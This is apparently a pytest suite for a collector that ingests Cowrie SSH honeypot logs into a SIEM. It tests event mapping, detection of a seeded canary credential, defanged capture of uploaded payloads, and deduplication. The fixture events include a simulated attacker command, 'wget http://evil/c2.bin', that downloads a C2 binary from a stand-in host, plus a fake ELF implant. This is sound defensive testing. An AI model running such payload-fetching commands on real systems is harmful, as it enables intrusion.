"""Covert ingest for the Cowrie shell decoy.

Docker is faked: docker_cp_file is patched to serve a canned JSON log and a
canned payload, so the mapping and capture logic is tested without a container.
"""
import hashlib
import json
from pathlib import Path

import pytest

import siem
import cowrie_ingest
from cowrie_ingest import CowrieCollector, match_planted
from sample_capture import SampleStore
from verdict_db import VerdictDB
from canary_vault import CanaryVault


PAYLOAD = b"\x7fELF\x02\x01\x01\x00uploaded-implant-body" * 8
PSHA = hashlib.sha256(PAYLOAD).hexdigest()

# Real Cowrie event shapes, one per line as Cowrie writes them.
def _log(*events):
    return "\n".join(json.dumps(e) for e in events).encode("utf-8")

EVENTS = [
    {"eventid": "cowrie.session.connect", "src_ip": "203.0.113.9", "session": "s1"},
    {"eventid": "cowrie.login.success", "username": "svc_deploy",
     "password": "D3ploy-Ssh-K3y!", "src_ip": "203.0.113.9", "session": "s1"},
    {"eventid": "cowrie.command.input", "input": "uname -a",
     "src_ip": "203.0.113.9", "session": "s1"},
    {"eventid": "cowrie.command.input", "input": "wget http://evil/c2.bin",
     "src_ip": "203.0.113.9", "session": "s1"},
    {"eventid": "cowrie.session.file_upload", "shasum": PSHA,
     "outfile": f"var/lib/cowrie/downloads/{PSHA}", "filename": "/tmp/implant.bin",
     "src_ip": "203.0.113.9", "session": "s1"},
]


@pytest.fixture
def vault(tmp_path):
    db = VerdictDB(db_path=tmp_path / "v.db", session_id="s1")
    yield CanaryVault(db)
    db.close()


@pytest.fixture
def collector(tmp_path, vault):
    store = SampleStore(tmp_path / "samples")
    ex = siem.SiemExporter(mode="jsonl", path=tmp_path / "siem.jsonl")
    col = CowrieCollector(ex, store=store, vault=vault, container="decoy_shell")
    return col, store, ex, tmp_path


def _serve(log_bytes):
    """A fake docker_cp_file: JSON log for the log path, payload for the sha."""
    def fake(container, path, max_bytes=0):
        if path == cowrie_ingest.LOG_PATH:
            return log_bytes, None
        if path.endswith(PSHA):
            return PAYLOAD, None
        return None, None
    return fake


def shipped(exporter):
    p = Path(exporter.path)
    return ([json.loads(l) for l in p.read_text(encoding="utf-8").splitlines()]
            if p.exists() else [])


# ── mapping ───────────────────────────────────────────────────────────────

def test_a_full_session_maps_to_findings(collector, monkeypatch):
    col, store, ex, _ = collector
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(*EVENTS)))
    col.scan()

    actions = [e["event"]["action"] for e in shipped(ex)]
    assert "decoy.connect" in actions
    assert "decoy.command" in actions
    assert "sample.executable" in actions


def test_a_stolen_credential_is_recognised_as_planted(collector, monkeypatch):
    """The login password is a credential we seeded, so it ships at 13 and
    burns the token — not an ordinary login."""
    col, store, ex, _ = collector
    col.vault.add("ssh_key", "D3ploy-Ssh-K3y!", "decoy_services", label="svc_deploy")
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(*EVENTS)))
    col.scan()

    planted = [e for e in shipped(ex)
               if e["event"]["action"] == "decoy.planted_cred"]
    assert planted and planted[0]["event"]["severity"] == 13


def test_an_unseeded_login_is_an_ordinary_success(collector, monkeypatch):
    col, store, ex, _ = collector       # vault has no matching token
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(*EVENTS)))
    col.scan()
    actions = [e["event"]["action"] for e in shipped(ex)]
    assert "decoy.login_success" in actions
    assert "decoy.planted_cred" not in actions


def test_an_uploaded_payload_is_captured_defanged(collector, monkeypatch):
    col, store, ex, tmp = collector
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(*EVENTS)))
    col.scan()

    assert col.captured == 1
    assert store.has(PSHA)
    on_disk = (tmp / "samples" / f"{PSHA}.quar").read_bytes()
    assert not on_disk.startswith(b"\x7fELF"), "runnable payload on disk"
    assert store.unpack(PSHA) == PAYLOAD

    sample = next(e for e in shipped(ex)
                  if e["event"]["action"] == "sample.executable")
    assert sample["threat"]["kill_chain_stage"] == "installation"
    assert sample["session_id"] == "s1"


def test_the_wget_url_survives_even_when_the_fetch_does_not(collector, monkeypatch):
    """A no-egress decoy cannot fetch the payload, but the command carrying the
    URL is still shipped — the URL is intelligence on its own."""
    col, store, ex, _ = collector
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(*EVENTS)))
    col.scan()
    cmds = [e.get("command") for e in shipped(ex)
            if e["event"]["action"] == "decoy.command"]
    assert any("wget http://evil/c2.bin" in (c or "") for c in cmds)


def test_the_same_log_is_not_processed_twice(collector, monkeypatch):
    """The poll re-reads the whole file each time; a line already handled must
    not ship again."""
    col, store, ex, _ = collector
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(*EVENTS)))
    col.scan()
    first = len(shipped(ex))
    col.scan()
    assert len(shipped(ex)) == first


def test_a_download_with_no_shasum_captures_nothing(collector, monkeypatch):
    """A fetch that never landed has no file to pull."""
    col, store, ex, _ = collector
    ev = {"eventid": "cowrie.session.file_download",
          "url": "http://evil/x", "src_ip": "1.2.3.4", "session": "s1"}
    monkeypatch.setattr(cowrie_ingest, "docker_cp_file", _serve(_log(ev)))
    col.scan()
    assert col.captured == 0


# ── planted-credential match ────────────────────────────────────────────────

def test_planted_match_is_on_the_password(vault):
    vault.add("ssh_key", "S3cret-ssh", "decoy_services", label="svc")
    assert match_planted(vault, "S3cret-ssh")
    assert not match_planted(vault, "wrong")
    assert not match_planted(vault, "")
